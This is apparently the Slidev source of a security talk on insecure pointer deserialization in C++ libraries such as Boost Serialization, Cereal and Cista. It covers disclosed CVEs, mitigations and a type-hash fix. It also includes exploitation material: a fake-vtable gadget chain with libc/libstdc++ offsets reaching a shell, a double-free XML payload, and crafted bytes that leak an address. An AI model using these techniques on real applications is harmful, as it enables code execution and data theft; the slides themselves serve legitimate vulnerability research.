    { field: 'buffer', confusedField: 'buffer', size: 8, value: '', color: 'blue', actualType: 'char*', confusedType: 'char*' },
    { field: 'size', confusedField: 'size', size: 8, value: '(controllable)', color: 'red', actualType: 'size_t', confusedType: 'size_t' },
    { field: 'capacity', confusedField: 'capacity', size: 8, value: '(controllable)', color: 'red', actualType: 'size_t', confusedType: 'size_t' },
  ]"
/>
</div>
<div v-click="[2, 3]">
<TypeConfusionTable 
  actualTypeOverall="FakeNews"
  confusedTypeOverall="string"
  :rows="[
    { field: 'vptr', confusedField: 'buffer', size: 8, value: '', color: 'yellow', actualType: 'function**', confusedType: 'char*' },
    { field: 'number', confusedField: 'size', size: 8, value: '(controllable)', color: 'red', actualType: 'uint64_t', confusedType: 'size_t' },
    { field: '', confusedField: 'capacity', size: 8, value: '', color: 'blue', actualType: '', confusedType: 'size_t' },
  ]"
/>
</div>
<div v-click="3">
<TypeConfusionTable 
  actualTypeOverall="TwinTower"
  confusedTypeOverall="string"
  :rows="[
    { field: 'x', confusedField: 'buffer', size: 8, value: '(controllable)', color: 'red', actualType: 'uint64_t', confusedType: 'char*' },
    { field: 'y', confusedField: 'size', size: 8, value: '(controllable)', color: 'red', actualType: 'uint64_t', confusedType: 'size_t' },
    { field: '', confusedField: 'capacity', size: 8, value: '', color: 'blue', actualType: '', confusedType: 'size_t' },
  ]"
/>
</div>

---
layout: two-cols-header-upper
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# fakevtable in Cereal

<RibbonBanner text="Example" color="green" />

::left::
```cpp
struct Square { virtual void draw(); };
shared_ptr<uint64_t> a;
shared_ptr<Square> b;
```

::right::

::bottom::
<TypeConfusionTable 
  actualTypeOverall="uint64_t"
  confusedTypeOverall="Square"
  :rows="[
    { field: '', confusedField: 'vptr', size: 8, value: '', color: 'red', actualType: 'uint64_t', confusedType: 'function**' },
    // { field: '', confusedField: 'size', size: 8, value: '', color: 'blue', actualType: '', confusedType: 'size_t' },
    // { field: '', confusedField: 'capacity', size: 8, value: '', color: 'blue', actualType: '', confusedType: 'size_t' },
  ]"
/>

<br>
<div v-click=1>

But what if no `win` function?

How to ACE?
</div>
<div v-click=2>

Make our own!
![](/assets/Modern_Problems_Require_Modern_Solutions.jpg){.memeimg}
</div>


<style>
  .memeimg {
    position: absolute;
    width: 250px;
    bottom: 2%;
    right: 50%;
    transform: translateX(50%);
  }
</style>

---
layout: two-cols-header-upper
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# DIY Win Function

<RibbonBanner text="Example" color="green" />

::left::
```cpp
struct FourWheelDrive { uint64_t x[4]; };
struct Square { virtual void draw(); };
shared_ptr<FourWheelDrive> a;
shared_ptr<Square> b;
```

::right::

::bottom::
<div>
<TypeConfusionTable 
  actualTypeOverall="FourWheelDrive"
  confusedTypeOverall="Square"
  :rows="[
    { field: '', confusedField: 'vptr', size: 8, value: '[this + 0x08]', color: 'yellow', actualType: 'uint64_t', confusedType: 'function**' },
    { field: '', confusedField: '', size: 8, value: 'libstdcpp+0xf0a0c', color: 'blue', actualType: 'uint64_t', confusedType: '' },
    { field: '', confusedField: '', size: 8, value: 'libstdcpp+0xf5e83', color: 'blue', actualType: 'uint64_t', confusedType: '' },
    { field: '', confusedField: '', size: 8, value: 'libc+0xef4ce', color: 'blue', actualType: 'uint64_t', confusedType: '' },
  ]"
/>
</div>

<!-- ```cpp
void* fake_vtable[] = {&libstdcpp+0xf0a0c, &libstdcpp+0xf5e83, &libc+0xef4ce};
``` -->

<div v-click=1 class="floating-code">

```cpp
void* fake_vtable[] = {&fake_win};

b->draw(); // virtual func called
// --> calls
void fake_win() {
  $r12 = 0; // libstdcpp + 0xf0a0c
  $rbx = 0; // libstdcpp + 0xf5e83
  one_gadget(); // libc + 0xef4ce
  // --> system("/bin/sh")
}
```
</div>

<div v-click=2 class="floating-img">

![](/assets/breakfast_full_script_demo.webp)
</div>

<style>
  .floating-code {
    position: absolute;
    top: 55%;
    left: 55%;
    width: 400px;
  }
  .floating-img {
    position: absolute;
    top: 5%;
    left: 50%;
    transform: translateX(-50%);
    /* width: 400px; */
  }
</style>

<!--
SKIPPPP
-->

---
layout: default
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# What other libraries can serialize pointers?

| Library                    | Boost Serialization | Cereal       | Bitsery    | HPX      | Cista     |
|:---------------------------|:--------------------|:-------------|------------|----------|-----------|
| Supports Shared Pointers?  | Yes                 | Yes          | Yes, kinda | Yes      | Kinda lol |
| Supports Unique Pointers?  | <span v-mark.underline.green>Yes, std</span>            | <span v-mark.cross.red={at:2}>Yes, std</span>     | <span v-mark.cross.red={at:2}>Yes, kinda</span> | No       | No        |
| Supports Raw Pointers?     | <span v-mark.underline.green={at:1}>Haha, yes!</span>                | Heck no!     | <span v-mark.cross.red={at:2}>Lol, kinda</span> | Yuck, no | No        |
| Zero-Copy Deserialization? | No                  | No           | No         | No       | <span v-mark.circle.green={at:1}>Yes</span>       |
| Format                     | Binary, Text, XML   | Binary, JSON | Binary     | Binary   | Binary    |

<!-- | Uses Custom API           | No, std             | No, std      | Yes             | No, std | Yes       | -->

<br>

- Follow-Up Question 1: Are unique/raw pointers vulnerable?
- Follow-Up Question 2: Do the same techniques apply to libraries with zero-copy deserialization?


---
layout: section
part: Insecure Deserialization of Pointers in C++
---

# Follow-Up Question 1: <br> What about unique/raw pointers?

<!-- Same issue as shared pointers + more surface (in Boost Serialization). -->

---
layout: default
part: Insecure Deserialization of Pointers in C++
section: Ownership Confusion in Boost Serialization
---

# Ownership Confusion with Unique Pointers

Type Confusion: confusion in ***pointer-data semantics***

Ownership Confusion: confusion in ***ownership semantics***

<br>
<br>

![](/assets/confusionism.png){style="width:160px; justify-self: center"}

---
layout: two-cols-header
part: Insecure Deserialization of Pointers in C++
section: Ownership Confusion in Boost Serialization
---

# Ownership Confusion with Unique Pointers

::left::
Code:
````md magic-move {at:2}
```cpp
unique_ptr<Foo> x = make_unique<Foo>(Foo{42});
unique_ptr<Foo> y = make_unique<Foo>(Foo{43});
boost::archive::xml_oarchive oa(cout);
oa << BOOST_SERIALIZATION_NVP(x);
oa << BOOST_SERIALIZATION_NVP(y);
```
```cpp
unique_ptr<Foo> x;
unique_ptr<Foo> y;
boost::archive::xml_iarchive ia(cin);
ia >> BOOST_SERIALIZATION_NVP(x);
ia >> BOOST_SERIALIZATION_NVP(y);
```
````

<div v-click=3>

```
free(): double free detected in tcache 2
Aborted
```
# BOOM! {style="justify-self: center"}
</div>

::right::
Payload:
````md magic-move {at:1}
```xml {6-16}
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE boost_serialization>
<boost_serialization
  signature="serialization::archive"
  version="19">
<x class_id="0" tracking_level="0" version="0">
    <tx class_id="1" tracking_level="1" 
        version="0" object_id="_0">
        <data>42</data>
    </tx>
</x>
<y>
    <tx class_id_reference="1" object_id="_1">
        <data>43</data>
    </tx>
</y>
</boost_serialization>
```
```xml {6-14|6-14|6-14}
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE boost_serialization>
<boost_serialization
  signature="serialization::archive"
  version="19">
<x class_id="0" tracking_level="0" version="0">
    <tx class_id="1" tracking_level="1" 
        version="0" object_id="_0">
        <data>42</data>
    </tx>
</x>
<y>
    <tx class_id_reference="1" object_id="_0">
</y>
</boost_serialization>
```
````

---
layout: default
part: Insecure Deserialization of Pointers in C++
section: Ownership Confusion in Boost Serialization
---

# What happened?

<v-switch>
<template #1><div class="my-v-click-1"></div></template>
</v-switch>

<div class="image-container">
<img class="scrollable-image" src="/assets/deserialization_diagram_double_free_primitive-1285w.webp"/>
</div>

<style>
.image-container {
  height: 440px;
  mask-image: linear-gradient(
    to top,
    transparent 0%,
    black 10%,
    black 98%,
    transparent 100%
  );
  -webkit-mask-image: linear-gradient(
    to top,
    transparent 0%,
    black 10%,
    black 98%,
    transparent 100%
  );
  position: relative;
}

.scrollable-image {
  width: 100%;
  height: auto;
  display: block;
  transition: transform 0.8s ease;
}

.scrollable-image {
  transform: translateY(0);
}

div:has(.slidev-vclick-target.slidev-vclick-current > .my-v-click-1) + * .scrollable-image {
  transform: translateY(-35%);
}
</style>

---
layout: section
part: Insecure Deserialization of Pointers in C++
---

# Follow-Up Question 2: <br> What about zero-copy deserialization?

<!-- Address Leak in Cista. -->

---
layout: two-cols-header
part: Insecure Deserialization of Pointers in C++
section: Zero-Copy Deserialization
---

# Zero-Copy Deserialization

::left::

- Normally, deserialization happens like so:
  - Allocate memory
  - Call `deserialize(payload)`
    - Bytes from payload are copied into allocated memory

<v-click>

- Zero-copy does it a little differently:
  - <span v-mark.strike-through.orange=1>Allocate memory</span>
  - Call `deserialize(payload)`
    - Returns a "view" into the buffer
</v-click>

::right::
<br>

![](/assets/bart-copying.jpeg){style="width: 90%; justify-self: right"}

---
layout: default
part: Insecure Deserialization of Pointers in C++
section: Zero-Copy Deserialization
---

# Cista Overview

This is what deserialization normally looks like for `cista::raw`.

- Serialized references store an "offset" to their data.
- When deserializing, offsets are resolved into pointers.

<div style="width: 70%; justify-self: center;">

![](/assets/deserialization_diagram_cista.png)

</div>

---
layout: default
part: Insecure Deserialization of Pointers in C++
section: Zero-Copy Deserialization
---

# Cista: Evil Offsets

What if the pointer is narcissistic?

<div style="width: 70%; justify-self: center;">

![](/assets/deserialization_diagram_cista_self.png)

</div>

When it updates it points to itself... 

When it is accessed, the pointer doubles as data.

<v-click>

![](/assets/spiderman-meme-2.webp){.memeimg}
</v-click>

<style>
  .memeimg {
    position: absolute;
    width: 50%;
    bottom: 2%;
    left: -5%;
  }
</style>

---
layout: two-cols-header-upper
part: Insecure Deserialization of Pointers in C++
section: Zero-Copy Deserialization
---

# Cista: Deserializing Evil Offsets

<RibbonBanner text="Example" color="green" />

::left::

```cpp
struct Number { uint64_t x; };
struct Foo {
    cista::indexed<Number> n;
    cista::raw::ptr<Number> p;
};

void f(const vector<unsigned char>& buffer) {
  auto foo = cista::deserialize<Foo>(buf);
  cout << "n: " << foo->n.x << endl;
  cout << "p: " << foo->p->x << endl;
}
``` 

<!-- 
```cpp
namespace data = cista::raw;
struct Number { uint64_t x; };
struct A {
    cista::indexed<Number> a;
    data::ptr<Number> pa;
};

void f(const vector<unsigned char>& buffer) {
  auto deserialized = cista::deserialize<A>(buf);
  cout << "a: " << deserialized->a.x << endl;
  cout << "pa: " << "0x" << hex << deserialized->pa->x << endl;
}
``` -->

::right::

<v-switch>
<template #0>
<div style="justify-self: center;">

![](/assets/deserialization_diagram_cista.png){style="margin-top: -1rem;"}

</div>
</template>
<template #1>
<div style="justify-self: center;">

![](/assets/deserialization_diagram_cista_self.png){style="margin-top: -1rem;"}

</div>
</template>
</v-switch>


::bottom::

<div style="margin-top: -1rem;">

<v-switch>
<template #-1>

Bytes get serialized and sent out to the wire (notice last 8 bytes are `0xffff'ffff'ffff'fff8` = -8 offset):

```
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xf8,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 
```

If deserialized, it outputs:
```
a: 42
pa: 0x2a
```
</template>


<template #0>

Attacker sends these bytes in (change offset to 0):

```
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 
```

Output is now:
```
a: 42
pa: 0x55887bee3718
```
</template>
</v-switch>

</div>

<!--
SKIPPP
-->

---
layout: default
---

# Cista-Specific Notes

- Address Leak primitive in Cista
- No Arbitrary Memory Read due to strict bounds checking
- No fakevtable as virtual class serialization isn't supported
- May be different depending on other library implementations.
- Potential transferrable concepts:
  - Pointer vs data semantic separation


---
layout: section
---

# Concluding Topics

(side quest bonanza)

---
layout: default
part: Terminus
section: Impact
---

# Impact: Affected Libraries

**Insecure Deserialization of Pointers** may lead to type confusion, resulting in potential information disclosure, control flow hijacking, and arbitrary code execution.

| CVE                          | Library             | Information Disclosure (Address Leak) | Information Disclosure (Memory Read) | Arbitrary Code Execution |
|------------------------------|---------------------|---------------------------------------|--------------------------------------|--------------------------|
| CVE-&#8288;2026-&#8288;11460 | Boost Serialization | <mdi-check/>                                     | <mdi-check/>                                    | <mdi-check/>                        |
| CVE-&#8288;2026-&#8288;11463 | Cereal              | <mdi-check/>                                     | <mdi-check/>                                    | <mdi-check/>                        |
| CVE-&#8288;2026-&#8288;9521  | Bitsery             | <mdi-check/>                                     | <mdi-check/>                                    | <mdi-check/>                        |
| CVE-&#8288;2025-&#8288;60889 | HPX                 | <mdi-check/>                                     | <mdi-check/>                                    | <mdi-check/>                        |
| CVE-&#8288;2025-&#8288;60887 | Cista               | <mdi-check/>                                     |                                      |                          |



---
layout: default
part: Terminus
section: Mitigations
---

# Mitigations

- Patch available for Bitsery and HPX (just released yesterday lol)
- Workarounds:
  - Do not expose over untrusted networks, do not accept untrusted data
  - Serialize using non-vulnerable types
  - Hand-roll your own secure serialization?
- But how to fix? (Just for funsies)

---
layout: default
part: Terminus
section: Root Cause
---

# Root Cause
...for Type Confusion via Shared Pointers

<RibbonBanner text="Side Quest" color="yellow" />

- Shallow copy (pointer copy) without type checking
- How to fix?
  - Track the typehash of pointers using a `map<pointer, typehash>` or `map<id, typehash>`
  - Reject invalid stuff. Embrace awesomeness.

````md magic-move
```cpp {|7}
template<class T>
void load_pointer(T*& new_ptr, int id) {
    if (is_new_id(id)) {
        load_and_deserialize_object<T>(new_ptr);
        id_to_obj_lookup[id] = new_ptr;
    } else {
        new_ptr = id_to_obj_lookup[id]; // Shallow copy shortcut.
    }
}
```

```cpp {7,9-11}
template<class T>
void load_pointer(T*& new_ptr, int id) {
    // T is to the current type we’re attempting to deserialize.
    if (is_new_id(id)) {
        load_and_deserialize_object<T>(new_ptr);
        id_to_obj_lookup[id] = new_ptr;
        id_to_type_hashmap[id] = typehash<T>();
    } else {
        // On subsequent checks, T could be a different type.
        if (id_to_type_hashmap[id] != typehash<T>())
            throw bad_type_error{};
        new_ptr = id_to_obj_lookup[id]; // Shallow copy shortcut.
    }
}
```
````

---
layout: default
part: Terminus
section: Further Research
---

# Further Research

- Arbitrary Memory Write (we assumed deserialized objects are `const`)
- Relax or find alternative conditions for exploitation
- Traditional fuzzing for memory corruption issues, integer overflow, etc.
- Explore insecure configurations in app-level code instead of package-level
- Similar attacks in other languages/libraries.

<br>
<br>

- These tools may be useful:
  - gdb, cppreference.com
  - eyeballs, brain
  - prompting skills (maybe)
  - (will release Dockerised examples and CTF chals later on)

---
layout: default
part: Terminus
section: Rust
---

# What about Rust?

<RibbonBanner text="Side Quest" color="yellow" />

- Does Rust remove this bug class? Perchance.
- rkyv: similar to Cista (Zero-Copy Deserialization)
  - Also can do Address Leak, using `unsafe` API (maintainer warns about this in docs)
- Very different ecosystem

---
layout: default
part: Terminus
section: Wrap Up
---

# Wrap Up

- Type Confusion (Address Leak, Memory Read, ACE)
- C++ Shenanigans (VTables, Smart Pointers)
- Expanded Deserialization Surface (serializing pointers/references)

<v-clicks depth=2 every=2>

- Food for Thought:
  - Has "intention" eroded in the age of AI?
  - How to express "intention" and avoid confusion?
    - Add more context? At what cost?
</v-clicks>


---
layout: default
part: Terminus
section: Bob a Builder
---

# Best Bubble Tea?

<RibbonBanner text="Side Quest" color="yellow" />

(Not sponsored.)
<br>

![](/assets/bubble-tea.jpg){style="width: 40%; justify-self: center"}

---
layout: end
---

# Keep Hacking
## Thank You

<div class="mt-8 flex flex-wrap justify-center gap-8 text-sm w-80">
  <div><mdi-github /> trebledj</div>
  <div><streamline-color-web-flat/> trebledj.me</div>
  <div><skill-icons-linkedin /> johnathan-law</div>
  <div><mdi-email /> trebledjjj@gmail.com</div>
</div>

![](/assets/bad_pun_virtual.png){.memeimg}

<style>
  .slidev-layout {
    padding-right: 24rem;
  }
  .memeimg {
    position: absolute;
    width: 30%;
    top: 5rem;
    right: 4rem;
  }
</style>
